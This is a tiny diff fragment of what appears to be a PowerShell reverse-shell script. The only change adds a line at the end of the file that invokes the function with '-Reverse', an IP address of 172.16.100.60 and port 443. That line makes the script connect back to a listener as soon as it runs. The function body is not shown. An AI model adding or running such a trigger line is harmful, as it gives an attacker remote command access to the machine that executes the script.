@@ -88,3 +88,4 @@ function reverse
     }
 }
 
+Power -Reverse -IPAddress 172.16.100.60 -Port 443
